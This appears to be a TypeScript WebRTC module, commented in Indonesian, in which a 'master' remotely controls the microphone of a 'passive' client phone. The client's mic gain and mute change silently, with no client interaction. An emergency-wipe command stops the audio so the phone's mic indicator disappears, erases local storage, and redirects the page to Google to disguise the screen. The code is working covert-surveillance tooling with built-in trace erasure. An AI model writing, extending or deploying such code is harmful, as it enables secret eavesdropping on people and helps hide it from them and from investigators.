/**
 * S.I.G.M.A DISKOMLEKAU — Tactical Master-Passive Client WebRTC Control Module
 * Pure Web API / Vanilla JS compatible implementation for:
 * 1. Remote Mic Sensitivity (GainNode) & Remote Mute Control over DataChannel
 * 2. Remote Emergency Wipe (Silent Self-Destruct)
 */

export type RemoteCommandType = 'SET_GAIN' | 'SET_MUTE' | 'EMERGENCY_WIPE';

export interface RemoteCommandPacket {
  type: RemoteCommandType;
  value?: number | boolean;
  timestamp: number;
}

export interface DataChannelLike {
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  send: (data: any) => void;
  readyState?: RTCDataChannelState;
  open?: boolean;
  onmessage?: ((event: MessageEvent) => void) | null;
  on?: (event: 'data', cb: (data: unknown) => void) => unknown;
}

/**
 * ============================================================================
 * 1. MASTER (AKTIF): Pengiriman Komando Jarak Jauh via WebRTC DataChannel
 * ============================================================================
 */

/**
 * Mengirim instruksi taktis dari Master ke Klien Pasif melalui DataChannel.
 * Mendukung native RTCDataChannel maupun PeerJS DataConnection.
 *
 * @param dataChannel - Instance RTCDataChannel atau PeerJS DataConnection
 * @param commandType - Jenis instruksi: 'SET_GAIN' | 'SET_MUTE' | 'EMERGENCY_WIPE'
 * @param value       - Nilai gain (contoh: 0.0 s/d 5.0) atau status mute (true/false)
 */
export function sendCommand(
  dataChannel: DataChannelLike | null | undefined,
  commandType: RemoteCommandType,
  value?: number | boolean
): boolean {
  if (!dataChannel) return false;

  const isNativeOpen = dataChannel.readyState === 'open';
  const isPeerJsOpen = dataChannel.open === true;

  if (!isNativeOpen && !isPeerJsOpen) {
    return false;
  }

  const packet: RemoteCommandPacket = {
    type: commandType,
    value,
    timestamp: Date.now(),
  };

  try {
    // Jika native RTCDataChannel, kirim sebagai JSON string; jika PeerJS, bisa kirim objek/string
    if (typeof dataChannel.readyState === 'string') {
      dataChannel.send(JSON.stringify(packet));
    } else {
      dataChannel.send(packet);
    }
    return true;
  } catch {
    return false;
  }
}

/**
 * Memicu sinyal EMERGENCY_WIPE (Tombol Bunuh Diri Jarak Jauh) ke Klien target.
 */
export function triggerEmergencyWipe(
  dataChannel: DataChannelLike | null | undefined
): boolean {
  return sendCommand(dataChannel, 'EMERGENCY_WIPE', true);
}

/**
 * ============================================================================
 * 2. KLIEN (PASIF): Eksekusi Diam-Diam (GainNode & Silent Self-Destruct)
 * ============================================================================
 */

export interface PassiveAudioPipeline {
  audioContext: AudioContext;
  gainNode: GainNode;
  processedStream: MediaStream;
  setRemoteGain: (gainValue: number) => void;
  setRemoteMute: (muted: boolean) => void;
  bindDataChannel: (channel: DataChannelLike) => void;
}

/**
 * Mengeksekusi penghapusan jejak darurat (Silent Self-Destruct) pada HP Klien:
 * a. Mematikan seluruh track audio/video (`track.stop()`) agar indikator mic di OS HP hilang seketika.
 * b. Menutup seluruh RTCPeerConnection, DataChannel, dan WebSocket secara sepihak.
 * c. Membersihkan seluruh localStorage & sessionStorage.
 * d. Melakukan redirect `window.location.replace()` ke Google untuk menyamarkan layar.
 */
export function silentSelfDestruct(options?: {
  streams?: (MediaStream | null | undefined)[];
  peerConnections?: (RTCPeerConnection | { close: () => void } | null | undefined)[];
  peerInstance?: { destroy: () => void } | null;
  audioContext?: AudioContext | null;
  redirectUrl?: string;
}): void {
  try {
    // a. Matikan seluruh track audio/video seketika agar indikator OS HP langsung hilang
    if (options?.streams) {
      options.streams.forEach((stream) => {
        if (stream) {
          stream.getTracks().forEach((track) => {
            try {
              track.enabled = false;
              track.stop();
            } catch {}
          });
        }
      });
    }

    // Matikan AudioContext jika ada
    if (options?.audioContext && options.audioContext.state !== 'closed') {
      options.audioContext.close().catch(() => {});
    }

    // b. Tutup semua RTCPeerConnection dan WebSocket signaling secara sepihak
    if (options?.peerConnections) {
      options.peerConnections.forEach((pc) => {
        if (pc) {
          try {
            pc.close();
          } catch {}
        }
      });
    }

    if (options?.peerInstance) {
      try {
        options.peerInstance.destroy();
      } catch {}
    }

    // c. Bersihkan seluruh penyimpanan lokal browser (localStorage & sessionStorage)
    try {
      localStorage.clear();
    } catch {}
    try {
      sessionStorage.clear();
    } catch {}
  } finally {
    // d. Redirect paksa tanpa menyisakan history (window.location.replace)
    const targetUrl = options?.redirectUrl || 'https://www.google.com';
    window.location.replace(targetUrl);
  }
}

/**
 * Melewatkan MediaStream mikrofon Klien melalui Web Audio API `GainNode`
 * dan memasang listener `dataChannel.onmessage` untuk mengeksekusi perintah Master
 * (`SET_GAIN`, `SET_MUTE`, dan `EMERGENCY_WIPE`) secara diam-diam tanpa interaksi UI Klien.
 */
export function setupPassiveAudio(
  rawMediaStream: MediaStream,
  initialDataChannel?: DataChannelLike | null,
  cleanupRefs?: {
    getExtraStreams?: () => (MediaStream | null | undefined)[];
    getPeerConnections?: () => (RTCPeerConnection | { close: () => void } | null | undefined)[];
    getPeerInstance?: () => { destroy: () => void } | null;
  },
  onStateUpdated?: (state: { gain: number; muted: boolean }) => void
): PassiveAudioPipeline {
  const AudioCtx =
    window.AudioContext ||
    (window as unknown as { webkitAudioContext: typeof AudioContext }).webkitAudioContext;

  const audioContext = new AudioCtx();
  const sourceNode = audioContext.createMediaStreamSource(rawMediaStream);
  const gainNode = audioContext.createGain();
  const destinationNode = audioContext.createMediaStreamDestination();

  let currentGain = 1.0;
  let isMuted = false;

  gainNode.gain.value = currentGain;
  sourceNode.connect(gainNode);
  gainNode.connect(destinationNode);

  const applyGainState = () => {
    if (audioContext.state === 'suspended') {
      audioContext.resume().catch(() => {});
    }
    const effectiveGain = isMuted ? 0 : currentGain;
    gainNode.gain.setTargetAtTime(effectiveGain, audioContext.currentTime, 0.02);

    // Juga sinkronkan track.enabled untuk mute tingkat stream
    destinationNode.stream.getAudioTracks().forEach((track) => {
      track.enabled = !isMuted;
    });

    if (onStateUpdated) {
      onStateUpdated({ gain: currentGain, muted: isMuted });
    }
  };

  const setRemoteGain = (gainValue: number) => {
    const clamped = Math.max(0, Math.min(8, Number(gainValue) || 0));
    currentGain = clamped;
    applyGainState();
  };

  const setRemoteMute = (muted: boolean) => {
    isMuted = Boolean(muted);
    applyGainState();
  };

  const handleIncomingCommand = (rawPayload: unknown) => {
    let packet: RemoteCommandPacket | null = null;

    if (typeof rawPayload === 'string') {
      try {
        packet = JSON.parse(rawPayload) as RemoteCommandPacket;
      } catch {
        return;
      }
    } else if (rawPayload && typeof rawPayload === 'object') {
      packet = rawPayload as RemoteCommandPacket;
    }

    if (!packet || !packet.type) return;

    switch (packet.type) {
      case 'SET_GAIN': {
        if (typeof packet.value === 'number') {
          setRemoteGain(packet.value);
        }
        break;
      }
      case 'SET_MUTE': {
        setRemoteMute(Boolean(packet.value));
        break;
      }
      case 'EMERGENCY_WIPE': {
        silentSelfDestruct({
          streams: [
            rawMediaStream,
            destinationNode.stream,
            ...(cleanupRefs?.getExtraStreams ? cleanupRefs.getExtraStreams() : []),
          ],
          peerConnections: cleanupRefs?.getPeerConnections
            ? cleanupRefs.getPeerConnections()
            : [],
          peerInstance: cleanupRefs?.getPeerInstance
            ? cleanupRefs.getPeerInstance()
            : null,
          audioContext,
          redirectUrl: 'https://www.google.com',
        });
        break;
      }
    }
  };

  const bindDataChannel = (channel: DataChannelLike) => {
    // 1. Jika mendukung standar WebRTC RTCDataChannel.onmessage
    if ('onmessage' in channel) {
      const prevOnMessage = channel.onmessage;
      channel.onmessage = (event: MessageEvent) => {
        if (prevOnMessage) prevOnMessage(event);
        handleIncomingCommand(event.data);
      };
    }

    // 2. Jika mendukung PeerJS DataConnection.on('data')
    if (typeof channel.on === 'function') {
      channel.on('data', (data: unknown) => {
        handleIncomingCommand(data);
      });
    }
  };

  if (initialDataChannel) {
    bindDataChannel(initialDataChannel);
  }

  return {
    audioContext,
    gainNode,
    processedStream: destinationNode.stream,
    setRemoteGain,
    setRemoteMute,
    bindDataChannel,
  };
}
